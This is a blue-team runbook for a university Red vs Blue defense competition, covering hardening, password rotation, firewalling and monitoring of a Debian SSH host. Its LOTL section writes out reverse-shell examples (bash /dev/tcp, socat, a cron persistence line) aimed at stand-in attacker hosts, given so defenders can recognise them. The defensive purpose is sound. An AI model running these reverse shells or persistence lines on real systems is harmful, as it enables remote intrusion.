# RvB Competition Runbook — Team 2: Tweek Bros Coffeehouse

> **Cal Poly Pomona** · SWIFT × ISACA Red vs Blue · CBA 162 · February 28, 2026

**My Machine:** Tweek Bros Coffeehouse · `192.168.1.13` · Debian 12 · **Scored service:** SSH (port 22)

> One of two runbooks I authored as **Team Lead** for this competition. Each defended machine in our environment had a dedicated runbook; remaining machines were covered by teammates.

---

## Table of Contents

1. [Environment Overview](#1-environment-overview)
2. [Schedule](#2-schedule)
3. [Before Competition Starts](#3-before-competition-starts)
4. [Phase 1 — First 30 Minutes](#4-phase-1--first-30-minutes-200230-pm)
5. [Phase 2 — Ongoing Monitoring](#5-phase-2--ongoing-monitoring-every-2030-minutes)
6. [Living Off The Land (LOTL) Defense](#6-living-off-the-land-lotl-defense)
7. [Script Reference](#7-script-reference--toolkit)
8. [Emergency Procedures](#8-emergency-procedures)
9. [Scoring and PCR Reminders](#9-scoring-and-pcr-reminders)
10. [Injects](#10-injects)
11. [Quick Command Reference](#11-quick-command-reference)
12. [Final Notes](#12-final-notes)

---

## 1. Environment Overview

| Machine | IP | OS | Scored Service |
|---|---|---|---|
| **Tweek Bros Coffeehouse (MINE)** | `192.168.1.13` | Debian 12 | SSH port 22 |
| UFO (Flask — depends on my DB) | `192.168.1.14` | Debian 12 | Flask port 80 |
| Tegridy Farms | `192.168.1.15` | Kubuntu | DNS port 53 |
| City Wok DC (Domain Controller) | `192.168.1.111` | Win Server 2022 | WordPress port 80 |
| City Sushi FS | `192.168.1.12` | Win Server 2022 | FTP 20/21 |

>  **CRITICAL:** The Flask app on UFO (`192.168.1.14`) uses the **database on my machine**. If my box goes down, UFO goes with it — I'm effectively protecting **2 scored services**.

>  **CRITICAL:** Scoreboard IP rotates — it cannot be allowlisted. Port 22 must stay open to **all** inbound.

-  **Scoreboard:** `http://172.16.215.250` — log in with team credentials from the team channel
-  **PCR (Password Change Request) format:** `User,password` on separate lines — submit after **every** password rotation

---

## 2. Schedule

| Time | Action |
|---|---|
| 11:30 AM | Briefing — get VPN creds, Proxmox creds, meet team, assign roles |
| 12:00 PM | Tutoring session — done before comp starts |
| **2:00 PM** | **COMPETITION STARTS — execute Phase 1 immediately** |
| 2:00–2:30 | Phase 1: Inventory + Hardening (critical window) |
| 2:30–4:30 | Phase 2: Monitor, check logs, respond to threats, injects |
| 4:30 PM | Competition ends |
| 5:00 PM | Debrief and Awards |

---

## 3. Before Competition Starts

> **Do NOT touch machines until 2:00 PM.**

Prepare all scripts on `pastebin.com` ahead of time — that's the copy-paste method for the competition environment.

- Get VPN credentials and Proxmox credentials from the team channel
- VPN on → visit `https://proxmox.sdc.cpp` → select **SDC** realm → log in
- Locate your machine in pool view: **Tweek Bros Coffeehouse**
- **Do NOT power on any machine before 2:00 PM** — disqualification
- Pre-stage these on pastebin: `firstrun.sh`, `passwd.sh`, `ufw.sh` (edited), SSH hardening snippet, monitoring snippet
- Confirm team role assignments — who owns which machine, who handles injects

### Edited `ufw.sh` for Tweek Bros (port 22 only)

Use this version — it removes unnecessary ports from the original script:

```bash
sudo ufw --force reset
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow 22
sudo ufw deny 4444
sudo ufw deny 1337
sudo ufw deny 6666
sudo ufw deny 6667
sudo ufw deny 9001
sudo ufw deny 31337
sudo ufw enable
sudo ufw status verbose
```

>  Do **NOT** open 8080, 3306, or 445 — not a scored service, only attack surface.

---

## 4. Phase 1 — First 30 Minutes (2:00–2:30 PM)

>  **Time is critical. Execute in this exact order. Do not skip steps.**

### Step 1 — Verify You Are On The Right Box

```bash
whoami && id && hostname && uname -a && cat /etc/os-release
```

Confirm: **Debian 12, IP `192.168.1.13`**. If wrong machine — stop and contact Green Team.

```bash
w && last | head -20
```

Check for unexpected active sessions. If you see an unfamiliar user logged in, note their PID and kill it:

```bash
kill -9 <PID>
```

### Step 2 — Inventory (Save Output as Baseline)

```bash
bash inventory.sh | tee /tmp/baseline.txt
```

Read the output carefully. Note:

- All users with login shells — anything unexpected is a backdoor
- All open ports — anything besides 22 and the DB port is suspicious
- Running services — kill anything unrecognized
- Docker containers, if any
- Crontab entries — a red team persistence method

Also save a process baseline:

```bash
ps aux > /tmp/baseline_ps.txt
```

### Step 3 — Run `firstrun.sh`

```bash
bash firstrun.sh
```

This script automatically:

- Installs tools: `tmux`, `htop`, `nmap`, `ufw`, `rkhunter`, `tcpdump`, `pspy64`, `linpeas`
- Removes netcat (red team tool)
- Backs up `/etc`, `/bin`, `/var/www`, `/root`, crontabs, PAM config to `/tmp/initial/`
- Hardens SSH: `PermitRootLogin no`, `X11Forwarding no`, `AllowTcpForwarding no`, `PermitEmptyPasswords no`
- Locks down all `php.ini` files found (disables `exec`, `system`, `shell_exec`, etc.)
- Fixes `/etc/passwd` (644) and `/etc/shadow` (600) permissions
- Restarts SSH and web services
- Downloads `pspy64` and `linpeas.sh` to the current directory

>  **After `firstrun.sh` — VERIFY SSH hardening actually applied:**

```bash
sshd -T | grep -E 'permitrootlogin|passwordauthentication|x11forwarding|allowtcpforwarding'
```

All should show hardened values. If not, manually edit `/etc/ssh/sshd_config` and restart sshd.

### Step 4 — Rotate All Passwords

```bash
bash passwd.sh | tee /tmp/passwords.txt
```

Output format: `USER,PASSWORD` — save this somewhere safe (phone notes, paper).

>  **IMMEDIATELY after `passwd.sh` — submit a PCR to the scoreboard or you will fail SSH service checks.**

Go to `http://172.16.215.250`, log in, and submit the PCR in this format:

```
root,NewGeneratedPassword
user1,NewGeneratedPassword
```

One line per user. Submit **all** users that could be used for SSH scoring.

### Step 5 — Apply Firewall

```bash
bash ufw.sh   # use the edited version with port 22 only
```

>  **CRITICAL** — before closing your current session, open a **second terminal** and verify SSH still works:

```bash
ssh user@192.168.1.13
```

If you can connect — firewall is good. If not, you locked yourself out — use the Proxmox console to fix.

### Step 6 — Install Fail2Ban (SSH Brute Force Protection)

```bash
apt install fail2ban -y
systemctl enable fail2ban && systemctl start fail2ban
systemctl status fail2ban
```

Default config bans IPs after 5 failed attempts. Protects your scored SSH service from brute force.

### Step 7 — Check and Secure the Database

UFO's Flask app depends on your database. Find what's running:

```bash
systemctl status mysql 2>/dev/null || systemctl status mariadb 2>/dev/null || systemctl status postgresql 2>/dev/null
```

Verify the database is **NOT** world-facing (must be localhost only):

```bash
ss -tunp | grep 3306   # MySQL/MariaDB
ss -tunp | grep 5432   # PostgreSQL
```

Output should show `127.0.0.1:3306`, **NOT** `0.0.0.0:3306`. If world-facing, fix it:

```bash
nano /etc/mysql/mysql.conf.d/mysqld.cnf
# Set: bind-address = 127.0.0.1
systemctl restart mysql
```

### Step 8 — Check for Existing Backdoors

```bash
bash bad.sh | tee /tmp/bad_output.txt
```

Look for: dangerous SUID binaries, world-writable files, NOPASSWD sudo entries, LD_PRELOAD hooks.

Also manually check:

```bash
find /tmp /dev/shm -type f 2>/dev/null
```

Red teams stage payloads here. Delete anything suspicious.

```bash
find / -perm 4000 2>/dev/null | head -30
```

Compare to a known-good SUID list — unexpected entries are backdoors.

### Step 9 — Hash Critical Binaries (Integrity Baseline)

```bash
md5sum /bin/bash /bin/ls /bin/ps /usr/sbin/sshd /bin/su > /tmp/hashes.txt
```

Check periodically during the competition:

```bash
md5sum -c /tmp/hashes.txt
```

Any **FAILED** result means a binary was replaced — a serious LOTL attack.

### Step 10 — Start Monitoring in tmux

```bash
tmux new -s monitor
```

In tmux, open multiple windows (`Alt+G` for new window, `Alt+1-9` to switch):

- **Window 1:** `pspy64` running continuously
- **Window 2:** `tail -f /var/log/auth.log`
- **Window 3:** free for investigation commands

```bash
# Window 1
chmod +x pspy64 && ./pspy64

# Window 2
tail -f /var/log/auth.log
```

---

## 5. Phase 2 — Ongoing Monitoring (Every 20–30 Minutes)

### Authorized Keys Check (LOTL Persistence)

The red team's favorite persistence method — drop an SSH key and come back silently:

```bash
cat /root/.ssh/authorized_keys
cat /home/*/.ssh/authorized_keys 2>/dev/null
```

If you see a key you did not put there — delete it immediately and check for other persistence.

### Crontab Check (Scheduled Persistence)

```bash
crontab -l
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /var/spool/cron/
```

New entries that weren't in your `/tmp/baseline.txt` are red flags. Remove and investigate.

### Active Connections

```bash
ss -tunp
```

Look for outbound connections to non-local IPs from unexpected processes. If `bash`, `python`, or `perl` is connecting out — reverse shell.

### Process Diff Against Baseline

```bash
ps aux > /tmp/current_ps.txt && diff /tmp/baseline_ps.txt /tmp/current_ps.txt
```

New processes not in your baseline need investigation.

### Login Activity

```bash
bash injects/login.sh
bash injects/logten.sh
```

`login.sh`: success/fail counts. `logten.sh`: ranked list of targeted usernames. High fail counts on a username = brute force in progress.

### Reverse Shell Killer

```bash
bash krs.sh &
```

Runs every 10 seconds, killing processes that look like reverse shells (`nc`, `netcat`, `bash`/`python`/`perl` with external IPs). Runs in the background.

>  `krs.sh` will **NOT** catch Living Off the Land attacks — see [Section 6](#6-living-off-the-land-lotl-defense).

### Rootkit Check

```bash
rkhunter --update && rkhunter --check --skip-keypress
```

Run this once mid-competition. Catches common rootkits and suspicious system modifications.

### Service Health Check

```bash
systemctl status ssh
ss -tunp | grep :22
```

Verify SSH is still listening. If down — restart immediately:

```bash
systemctl restart ssh
```

Then check the scoreboard debug info to see if service checks are passing.

---

## 6. Living Off The Land (LOTL) Defense

Red teamers who know what they're doing won't use netcat. They'll use tools already on the system. `krs.sh` won't catch these. Watch for:

### Bash TCP Redirect (No Tools Required)

```bash
bash -i >& /dev/tcp/attacker_ip/4444 0>&1
```

Pure bash reverse shell. Detectable via `pspy64` and `ss -tunp` showing bash connecting outbound.

### Socat (Installed by `firstrun.sh` Itself)

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker:4444
```

`firstrun.sh` installs socat as a defensive tool, but the red team can use it too. Watch `pspy64` for socat with external IPs.

### Authorized Keys Drop

Silent, persistent, looks like normal SSH traffic. Check `/root/.ssh/authorized_keys` every 20 minutes.

```bash
cat /root/.ssh/authorized_keys && cat /home/*/.ssh/authorized_keys 2>/dev/null
```

### Cron Persistence

```bash
*/5 * * * * bash -i >& /dev/tcp/attacker/4444 0>&1
```

Runs every 5 minutes, survives reboots. Check `/etc/cron.d/` and `crontab -l` every 20 minutes.

### Python One-liner

```bash
python3 -c 'import socket,subprocess...'
```

Visible in `pspy64` and `ps aux`. Look for `python3 -c` with network connections.

### Detection Strategy

-  `pspy64` catches everything spawning from cron or other processes without needing root
-  `ss -tunp` shows all active connections with process — bash/python connecting to an external IP is the signal
-  `diff /tmp/baseline_ps.txt` against current `ps aux` to spot new processes
-  Check `/tmp` and `/dev/shm` for staged payloads
-  `md5sum -c /tmp/hashes.txt` to detect replaced binaries

---

## 7. Script Reference — Toolkit

| Script | When to Run | What It Does |
|---|---|---|
| `inventory.sh` | **FIRST** — minute 1 | Hostname, IP, open ports, users, services, Docker, domain join status, mounts. Save with `\| tee /tmp/baseline.txt` |
| `firstrun.sh` | Phase 1 step 3 | Installs tools, backs up `/etc` `/bin` `/root`, hardens SSH, locks PHP, downloads pspy64/linpeas, fixes file permissions |
| `passwd.sh` | Phase 1 step 4 | Rotates all user passwords to random 4-word+`123!` passphrases. Save output. Submit PCR immediately after. |
| `bad.sh` | Phase 1 step 8 | Checks SUID binaries, capabilities, world-writable files, sudoers misconfig, sudo version vulns, LD_PRELOAD |
| `ufw.sh` | Phase 1 step 5 | Configures UFW firewall. **USE EDITED VERSION** — only allow port 22 for Tweek Bros |
| `fw.sh` | Alternative to `ufw.sh` | iptables-based. Requires env vars: `DISPATCHER`, `LOCALNETWORK`, `CCSHOST`. Run `env.sh` first. More powerful but complex. |
| `krs.sh` | Phase 2 background | Kills reverse shell processes every 10 sec. Run in background. Won't catch LOTL. |
| `snoopy.sh` | Phase 1 optional | Installs snoopy — hooks PAM, logs every command to file. Good for forensics if red team gets in. |
| `pom.sh` | Phase 1 optional | Backs up PAM config and binaries. Run early. Restore with `REVERT=true` if PAM is tampered. |
| `ipban.sh` | Emergency only | Blocks IP in/out and reboots. Usage: `bash ipban.sh 10.x.x.x`. Use when red team IP is known. |
| `webdb.sh` | Phase 1 if DB issues | Checks Apache/Nginx/MySQL/MariaDB/PostgreSQL/PHP/Docker. Shows weak MySQL creds, vhost configs. |
| `tmux.sh` | After starting tmux | Sets `Alt+1-9` window shortcuts and `Alt+G` for new window. Run once. |
| `injects/login.sh` | Ongoing monitoring | Counts successful and failed SSH login attempts from auth logs. |
| `injects/logten.sh` | Ongoing monitoring | Ranked list of usernames with most login attempts. Shows who red team is targeting. |
| `env.sh` | Before `fw.sh` only | Sets `DISPATCHER`, `LOCALNETWORK`, `CCSHOST` env vars needed by `fw.sh` |

---

## 8. Emergency Procedures

### SSH Service Down — Scoring Engine Failing

1. Check if sshd is running: `systemctl status ssh`
2. If down: `systemctl restart ssh`
3. Check if port 22 is listening: `ss -tunp | grep :22`
4. Check if UFW is blocking: `ufw status verbose`
5. Check scoreboard debug info for what's failing
6. If password was changed without PCR — submit PCR immediately

### Red Team Has Active Shell on My Machine

1. Identify their session: `w && ss -tunp`
2. Get their source IP from `ss` output
3. Ban it: `bash ipban.sh <their_IP>` — this reboots the machine
4. After reboot — check `authorized_keys` and crontabs immediately
5. Run `rkhunter` to check for installed rootkits
6. Run `md5sum -c /tmp/hashes.txt` to check binary integrity

### Database Down — UFO Flask App Failing

1. Check DB status: `systemctl status mysql`
2. Restart: `systemctl restart mysql`
3. Verify listening on localhost: `ss -tunp | grep 3306`
4. Check DB logs: `journalctl -u mysql -n 50`
5. Contact teammate who owns UFO — they may see Flask errors

### Machine Unrecoverable — Request Revert

Contact **@Green Team** in your team channel. Request a snapshot revert. Costs 500 points but better than losing 5 points/minute indefinitely.

>  After revert — redo **ALL** hardening from Phase 1. The machine goes back to its default vulnerable state.

### Locked Yourself Out of SSH

1. Use the Proxmox console to access the machine directly
2. Visit `https://proxmox.sdc.cpp`
3. Open the console for the Tweek Bros Coffeehouse VM
4. Fix the issue (firewall rule, sshd config, etc.)
5. Restart ssh: `systemctl restart ssh`

---

## 9. Scoring and PCR Reminders

Scoring engine checks SSH port 22 every minute. **5 points per successful check.** After 5 consecutive failures: **−5 points per check.**

>  **EVERY** password change requires a PCR submission or service checks will fail.

>  Scoreboard IP rotates — it cannot be blocked — port 22 must stay open to all.

>  Snapshot revert costs 500 points — last resort only.

**PCR format** at `http://172.16.215.250`:

```
root,YourNewPassword
otheruser,TheirNewPassword
```

-  After submitting a PCR — wait 1–2 minutes and check the scoreboard to confirm service checks are passing
-  Keep `/tmp/passwords.txt` from `passwd.sh` output — that's your source of truth for current creds

---

## 10. Injects

Injects are business emails from a fictional CEO/CTO/employee asking technical or non-technical questions. Scored separately from service uptime.

- Assign one teammate to own injects so technical people stay focused on machines
- Read the inject carefully — understand what they're actually asking
- Tailor the response to the audience — CEO gets an executive summary, CTO gets technical detail
- Be clear, concise, and professional

>  Don't let injects distract you from machine defense — your SSH service must stay up.

---

## 11. Quick Command Reference

### Immediate Checks

```bash
whoami && id && hostname && uname -a
w && last | head -20
ss -tunp
ps aux
cat /etc/passwd | grep -E '/bin/.*sh'
cat /root/.ssh/authorized_keys
```

### Service Management

```bash
systemctl status ssh
systemctl restart ssh
systemctl status mysql
systemctl restart mysql
ufw status verbose
```

### Log Monitoring

```bash
tail -f /var/log/auth.log
tail -f /var/log/syslog
journalctl -u ssh -n 50
```

### Persistence Checks

```bash
crontab -l && cat /etc/crontab && ls /etc/cron.d/
cat /root/.ssh/authorized_keys && cat /home/*/.ssh/authorized_keys 2>/dev/null
find /tmp /dev/shm -type f 2>/dev/null
```

### Integrity Checks

```bash
md5sum -c /tmp/hashes.txt
diff /tmp/baseline_ps.txt <(ps aux)
rkhunter --check --skip-keypress
```

### Network

```bash
ss -tunp
ufw status verbose
iptables -L -n -v
```

### Emergency

```bash
bash ipban.sh <IP>          # ban IP and reboot
systemctl restart ssh       # restart SSH
ufw allow 22                # ensure port 22 open
REVERT=true bash pom.sh     # restore PAM from backup
```

---

## 12. Final Notes

Your machine (Tweek Bros Coffeehouse) is the easiest scored service to defend — SSH on a Debian box. The main risk is accidentally breaking it yourself. Follow the order, verify SSH works after every change, submit a PCR after every password rotation, and you'll hold your points.

-  Run `inventory.sh` first — know your machine before touching anything
-  Submit a PCR after `passwd.sh` — do not skip this
-  Keep `pspy64` and `tail -f auth.log` running in tmux all competition
- ✅ Check `authorized_keys` and crontabs every 20–30 minutes
- ✅ If something breaks — the Proxmox console is your way back in

**Good luck. Lock it down.**
